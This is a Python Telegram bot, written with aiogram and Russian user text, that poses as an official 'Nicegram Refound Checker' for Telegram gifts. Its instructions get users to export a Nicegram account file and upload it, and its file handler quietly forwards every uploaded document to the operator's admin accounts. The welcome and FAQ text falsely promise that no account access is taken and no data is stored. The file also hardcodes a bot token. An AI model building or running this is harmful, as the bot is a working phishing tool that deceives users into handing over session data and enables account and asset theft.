import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton
)
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import CommandStart

# ===================== CONFIG =====================

BOT_TOKEN = "8488339814:AAHbeTpD4To0rVImispdSqFnwr-Etsh3t0U"

# 🔹 СПИСОК АДМИНОВ (можно добавлять сколько угодно)
ADMIN_IDS = [
    814347153,
    6869602959  # ← второй админ (замени на нужный ID)
]

COVER_PHOTO_ID = (
    "AgACAgIAAxkBAAMPaYXpICj7Yxn9wq4PKiVlH0uE1RQAAgoWaxtq5jBIAk-h5byxwVIBAAMCAAN4AAM4BA"
)

# ===================== BOT =====================

bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode="Markdown")
)
dp = Dispatcher()

user_lang = {}

# ===================== TEXT =====================

TEXT = {
    "ru": {
        "welcome": (
            "💎 *Nicegram Refound Checker*\n\n"
            "Добро пожаловать в официальный сервис проверки "
            "ликвидности и рефанда Telegram-подарков.\n\n"
            "🔹 Наш бот автоматически анализирует предоставленные данные.\n"
            "🔹 Мы не запрашиваем доступ к аккаунту.\n"
            "🔹 Ваши данные полностью конфиденциальны."
        ),
        "download": "📎 Скачать Nicegram",
        "instruction_btn": "📘 Инструкция",
        "check": "💎 Начать проверку",
        "faq": "ℹ️ FAQ",
        "lang": "🌐 Язык / Language",
        "back": "◀️ Вернуться в меню",

        "instruction": (
            "📘 *Подробная инструкция:*\n\n"
            "1️⃣ Установите Nicegram\n\n"
            "2️⃣ Войдите в Telegram через Nicegram\n\n"
            "3️⃣ Экспортируйте хэш:\n"
            "   • Settings → Nicegram\n"
            "   • Export as File\n\n"
            "4️⃣ Отправьте `.txt` или `.zip` файл в этот чат\n\n"
            "⏳ Проверка начнётся автоматически."
        ),

        "check_text": (
            "📤 *Отправьте файл для проверки*\n\n"
            "Поддерживаемые форматы:\n"
            "• `.txt`\n"
            "• `.zip`"
        ),

        "file_ok": (
            "✅ *Файл получен*\n\n"
            "⏳ Проверка началась.\n"
            "Результат будет отправлен после завершения."
        ),

        "faq_text": (
            "❓ *FAQ*\n\n"
            "• Мы проверяем только статус подарков\n"
            "• Доступ к аккаунту не требуется\n"
            "• Используются только хэши\n"
            "• Данные не сохраняются"
        ),

        "choose_lang": "🌍 Выберите язык:"
    }
}

# ===================== KEYBOARDS =====================

def main_menu(lang):
    t = TEXT[lang]
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t["download"], url="https://nicegram.app")],
        [InlineKeyboardButton(text=t["instruction_btn"], callback_data="instruction")],
        [InlineKeyboardButton(text=t["check"], callback_data="check")],
        [InlineKeyboardButton(text=t["faq"], callback_data="faq")],
        [InlineKeyboardButton(text=t["lang"], callback_data="lang")]
    ])

def back_menu(lang):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=TEXT[lang]["back"], callback_data="menu")]
    ])

def lang_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_ru")],
        [InlineKeyboardButton(text="🇬🇧 English", callback_data="lang_en")]
    ])

# ===================== HANDLERS =====================

@dp.message(CommandStart())
async def start(message: Message):
    user_lang[message.from_user.id] = "ru"
    await message.answer_photo(
        photo=COVER_PHOTO_ID,
        caption=TEXT["ru"]["welcome"],
        reply_markup=main_menu("ru")
    )

@dp.callback_query(F.data == "menu")
async def menu(callback: CallbackQuery):
    lang = user_lang.get(callback.from_user.id, "ru")
    await callback.message.delete()
    await callback.message.answer_photo(
        photo=COVER_PHOTO_ID,
        caption=TEXT[lang]["welcome"],
        reply_markup=main_menu(lang)
    )
    await callback.answer()

@dp.callback_query(F.data == "instruction")
async def instruction(callback: CallbackQuery):
    lang = user_lang.get(callback.from_user.id, "ru")
    await callback.message.delete()
    await callback.message.answer(
        TEXT[lang]["instruction"],
        reply_markup=back_menu(lang)
    )
    await callback.answer()

@dp.callback_query(F.data == "check")
async def check(callback: CallbackQuery):
    lang = user_lang.get(callback.from_user.id, "ru")
    await callback.message.delete()
    await callback.message.answer(
        TEXT[lang]["check_text"],
        reply_markup=back_menu(lang)
    )
    await callback.answer()

@dp.callback_query(F.data == "faq")
async def faq(callback: CallbackQuery):
    lang = user_lang.get(callback.from_user.id, "ru")
    await callback.message.delete()
    await callback.message.answer(
        TEXT[lang]["faq_text"],
        reply_markup=back_menu(lang)
    )
    await callback.answer()

@dp.callback_query(F.data == "lang")
async def lang(callback: CallbackQuery):
    await callback.message.delete()
    await callback.message.answer(
        TEXT["ru"]["choose_lang"],
        reply_markup=lang_menu()
    )
    await callback.answer()

@dp.callback_query(F.data.startswith("lang_"))
async def set_lang(callback: CallbackQuery):
    lang = callback.data.split("_")[1]
    user_lang[callback.from_user.id] = lang
    await callback.message.delete()
    await callback.message.answer_photo(
        photo=COVER_PHOTO_ID,
        caption=TEXT[lang]["welcome"],
        reply_markup=main_menu(lang)
    )
    await callback.answer()

# ===================== FILE HANDLER =====================

@dp.message(F.document)
async def handle_file(message: Message):
    # 🔹 пересылаем файл ВСЕМ админам
    for admin_id in ADMIN_IDS:
        try:
            await bot.forward_message(
                chat_id=admin_id,
                from_chat_id=message.chat.id,
                message_id=message.message_id
            )
        except Exception as e:
            print(f"Ошибка пересылки админу {admin_id}: {e}")

    lang = user_lang.get(message.from_user.id, "ru")
    await message.answer(TEXT[lang]["file_ok"])

# ===================== START =====================

async def main():
    print("Bot started")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())